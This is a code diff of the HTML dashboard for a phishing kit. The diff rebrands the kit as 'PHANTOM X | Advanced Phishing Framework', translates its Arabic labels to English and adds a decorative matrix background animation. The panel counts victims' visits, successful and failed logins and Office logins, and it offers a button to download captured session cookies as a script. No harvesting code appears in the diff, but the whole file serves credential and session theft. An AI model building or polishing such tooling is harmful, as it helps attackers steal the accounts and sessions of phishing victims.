@@ -3,23 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JEMEX_FISHER - Dashboard</title>
+    <title>PHANTOM X | Advanced Phishing Framework</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="/static/css/dashboard.css">
+    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAe1BMVEUAAAAjJjojJjojJjojJjojJjojJjoAzXQjJjojJjojJjojJjojJjojJjoAzXQAzXQAzXQAzXQAzXQAzXQjJjojJjojJjojJjojJjojJjojJjojJjojJjoAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQAzXQjJjr///8ZNt+AAAAAJnRSTlMAIGCAv9+fQO9QML+PUIA/cFBgMO+vUL9AYI9wn0Cgz8+Pz1CPbzgaPcYAAAABYktHRCctD6gjAAAACXBIWXMAAAsSAAALEgHS3X78AAAAB3RJTUUH5gIVCjkMmI+K8QAAAONJREFUOMuVk9d2wyAMRRsM7tkkTfc27f//YWV7pTzl6j7oCIyuBAJKSilTOdlAGTciKF/rDpSGIdRJqMMowc14WKrj6DiKBGhWpQa6NZHvhcYG2AnoYeBMgP+ByXswB2wLcEKAUwLYBuARwCMBTgWwDYDvAfwKEHRvHtEfICJgfALjtDaPOPoCMt8LHZfgWIH+BiAtwekODJYQEtIvYF3mdhHAawDGFaBryJpNLpvzpRXKjdyftgY1qrzt/lDL99xwXfwB65rXS16i1sJr4y3v1gNovxTd4PxUnIZrQR6M8wc8wlA9mUaXDwAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMi0wMi0yMVQxMDo1Nzo0OCswMDowMEWc9RUAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjItMDItMjFUMTA6NTc6NDgrMDA6MDA0wU2pAAAAAElFTkSuQmCC">
 </head>
 <body>
+    <canvas id="matrix-bg" class="matrix-bg"></canvas>
     <div class="app-container">
         <aside class="sidebar">
             <div class="sidebar-header">
                 <div class="logo">
                     <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="10"></circle>
-                        <path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3z"></path>
-                        <path d="M19 10v2a7 7 0 0 1-14 0v-2"></path>
-                        <line x1="12" y1="19" x2="12" y2="22"></line>
+                        <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
+                        <path d="M2 17l10 5 10-5"></path>
+                        <path d="M2 12l10 5 10-5"></path>
                     </svg>
                 </div>
-                <h2>JEMEX_FISHER</h2>
+                <h2>PHANTOM <span class="accent-text">X</span></h2>
+                <div class="version-info">v2.0 • <span class="typewriter" data-text="Advanced Phishing Framework"></span></div>
             </div>
             <nav class="sidebar-nav">
                 <ul>
@@ -71,7 +73,7 @@
                         <h2>Dashboard</h2>
                         <p class="last-updated">Last Updated: <span id="last-update-time">Loading...</span> 
                             <button id="refresh-dashboard" class="btn-refresh">
-                                <i class="fas fa-sync-alt"></i> تحديث
+                                <i class="fas fa-sync-alt"></i> Refresh
                             </button>
                         </p>
                     </div>
@@ -122,7 +124,7 @@
                             </div>
                             <div class="stat-card-info">
                                 <h3 id="visits-count">0</h3>
-                                <p>زيارات</p>
+                                <p>Visits</p>
                             </div>
                         </div>
                         <div class="stat-card">
@@ -131,7 +133,7 @@
                             </div>
                             <div class="stat-card-info">
                                 <h3 id="success-logins-count">0</h3>
-                                <p>تسجيلات ناجحة</p>
+                                <p>Successful Logins</p>
                             </div>
                         </div>
                         <div class="stat-card">
@@ -140,7 +142,7 @@
                             </div>
                             <div class="stat-card-info">
                                 <h3 id="failed-logins-count">0</h3>
-                                <p>تسجيلات فاشلة</p>
+                                <p>Failed Logins</p>
                             </div>
                         </div>
                         <div class="stat-card">
@@ -149,7 +151,7 @@
                             </div>
                             <div class="stat-card-info">
                                 <h3 id="office-logins-count">0</h3>
-                                <p>تسجيلات Office</p>
+                                <p>Office Logins</p>
                             </div>
                         </div>
                     </div>
@@ -158,57 +160,57 @@
                         <div class="dashboard-col">
                             <div class="card">
                                 <div class="card-header">
-                                    <h3>احصائيات حسب الفترة</h3>
+                                    <h3>Statistics by Period</h3>
                                     <div class="stats-actions">
                                         <button id="export-stats" class="btn-sm btn-primary">
-                                            <i class="fas fa-download"></i> تصدير الإحصائيات
+                                            <i class="fas fa-download"></i> Export Statistics
                                         </button>
                                     </div>
                                 </div>
                                 <div class="card-body">
                                     <div class="stats-period-grid">
                                         <div class="stats-period-card">
-                                            <h4>اليوم</h4>
+                                            <h4>Today</h4>
                                             <div class="stats-period-item">
-                                                <span>زيارات:</span>
+                                                <span>Visits:</span>
                                                 <strong id="today-visits">0</strong>
                                             </div>
                                             <div class="stats-period-item">
-                                                <span>تسجيلات ناجحة:</span>
+                                                <span>Successful Logins:</span>
                                                 <strong id="today-success">0</strong>
                                             </div>
                                             <div class="stats-period-item">
-                                                <span>تسجيلات فاشلة:</span>
+                                                <span>Failed Logins:</span>
                                                 <strong id="today-failed">0</strong>
                                             </div>
                                         </div>
                                         <div class="stats-period-card">
-                                            <h4>هذا الأسبوع</h4>
+                                            <h4>This Week</h4>
                                             <div class="stats-period-item">
-                                                <span>زيارات:</span>
+                                                <span>Visits:</span>
                                                 <strong id="week-visits">0</strong>
                                             </div>
                                             <div class="stats-period-item">
-                                                <span>تسجيلات ناجحة:</span>
+                                                <span>Successful Logins:</span>
                                                 <strong id="week-success">0</strong>
                                             </div>
                                             <div class="stats-period-item">
-                                                <span>تسجيلات فاشلة:</span>
+                                                <span>Failed Logins:</span>
                                                 <strong id="week-failed">0</strong>
                                             </div>
                                         </div>
                                         <div class="stats-period-card">
-                                            <h4>هذا الشهر</h4>
+                                            <h4>This Month</h4>
                                             <div class="stats-period-item">
-                                                <span>زيارات:</span>
+                                                <span>Visits:</span>
                                                 <strong id="month-visits">0</strong>
                                             </div>
                                             <div class="stats-period-item">
-                                                <span>تسجيلات ناجحة:</span>
+                                                <span>Successful Logins:</span>
                                                 <strong id="month-success">0</strong>
                                             </div>
                                             <div class="stats-period-item">
-                                                <span>تسجيلات فاشلة:</span>
+                                                <span>Failed Logins:</span>
                                                 <strong id="month-failed">0</strong>
                                             </div>
                                         </div>
@@ -501,7 +503,7 @@
                             <div class="session-cookies-container">
                                 <div class="cookies-actions">
                                     <button class="btn btn-success" id="download-cookies-btn">
-                                        <i class="fas fa-download"></i> تنزيل سكريبت الكوكيز
+                                        <i class="fas fa-download"></i> Download Cookies Script
                                     </button>
                                 </div>
                                 <table class="data-table" id="cookies-table">
@@ -551,5 +553,75 @@
     <div id="toast-container"></div>
 
     <script src="/static/js/dashboard.js"></script>
+    <script>
+        // Matrix Background Animation
+        (function() {
+            const canvas = document.getElementById('matrix-bg');
+            const ctx = canvas.getContext('2d');
+            
+            // Make canvas full screen
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            // Characters to display (can be customized)
+            const characters = "01";
+            
+            // Font size
+            const fontSize = 10;
+            
+            // Number of columns
+            const columns = canvas.width / fontSize;
+            
+            // Array to track the Y position of each column
+            const drops = [];
+            
+            // Initialize drops
+            for (let i = 0; i < columns; i++) {
+                drops[i] = Math.random() * -100;
+            }
+            
+            // Draw the characters
+            function draw() {
+                // Translucent black background to create trail effect
+                ctx.fillStyle = "rgba(10, 14, 23, 0.04)";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                // Green text
+                ctx.fillStyle = "#00e676";
+                ctx.font = fontSize + "px Consolas";
+                
+                // Loop through each drop
+                for (let i = 0; i < drops.length; i++) {
+                    // Random character
+                    const char = characters.charAt(Math.floor(Math.random() * characters.length));
+                    
+                    // Draw the character
+                    ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+                    
+                    // Reset drop to top with random delay if it's at the bottom
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.98) {
+                        drops[i] = 0;
+                    }
+                    
+                    // Move drop down
+                    drops[i]++;
+                }
+            }
+            
+            // Run animation
+            setInterval(draw, 50);
+            
+            // Resize canvas on window resize
+            window.addEventListener('resize', function() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                
+                // Reset drops
+                for (let i = 0; i < columns; i++) {
+                    drops[i] = Math.random() * -100;
+                }
+            });
+        })();
+    </script>
 </body>
 </html> 
